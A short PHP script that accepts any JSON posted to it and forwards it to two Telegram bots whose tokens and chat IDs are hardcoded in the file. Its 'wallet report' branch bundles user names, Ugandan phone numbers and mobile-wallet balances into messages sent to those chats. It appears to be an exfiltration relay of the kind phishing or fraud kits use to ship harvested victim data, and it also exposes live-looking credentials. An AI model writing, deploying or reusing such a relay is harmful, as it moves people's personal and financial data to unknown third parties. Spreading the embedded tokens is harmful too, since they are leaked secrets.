<?php

ini_set('display_errors', 1);
error_reporting(E_ALL);


/* TELEGRAM */

$bots = [

    [
        "token" => "8677498486:AAFyHSstosvrtaBJwj-_eV25U3eWKkbKwOo",
        "chat_id" => "8940716704"
    ],

    [
        "token" => "8880567979:AAEh_kpBSs7YzAYqLO_G6ZUqF-6m0nQJmWs",
        "chat_id" => "8938414761"
    ]

];



function sendTelegramToAll($bots,$message)
{

    foreach($bots as $bot){

        file_get_contents(
            "https://api.telegram.org/bot".$bot['token']."/sendMessage?".
            http_build_query([
                "chat_id"=>$bot['chat_id'],
                "text"=>$message
            ])
        );

    }

}



/* RECEIVE */

$input = file_get_contents("php://input");


if(!$input){

    exit("NO INPUT");

}



$data = json_decode($input,true);



if(!$data){

    sendTelegramToAll(
        $bots,
        "❌ JSON ERROR\n".$input
    );

    exit;

}



/* ACCEPT MESSAGE */

if(isset($data['message'])){


    sendTelegramToAll(
        $bots,
        $data['message']
    );


    echo "MESSAGE SENT";

    exit;

}



/* WALLET REPORT */

if(($data['type'] ?? '')=="wallet_report"){


    $users=$data['users'] ?? [];


    $total=0;


    $msg="💰 WALLET REPORT\n\n";


    foreach($users as $u){

        $wallet=(float)$u['wallet'];

        $total += $wallet;


        $msg.="👤 ".$u['name']."\n";
        $msg.="📱 +256".$u['phone']."\n";
        $msg.="💵 UGX ".number_format($wallet)."\n";
        $msg.="----------------\n";

    }


    $msg.="\n🔥 TOTAL WALLET\n";
    $msg.="UGX ".number_format($total);



    sendTelegramToAll(
        $bots,
        $msg
    );


    echo "WALLET SENT";

    exit;

}


sendTelegramToAll(
    $bots,
    "⚠️ UNKNOWN DATA\n\n".$input
);


echo "UNKNOWN";

?>
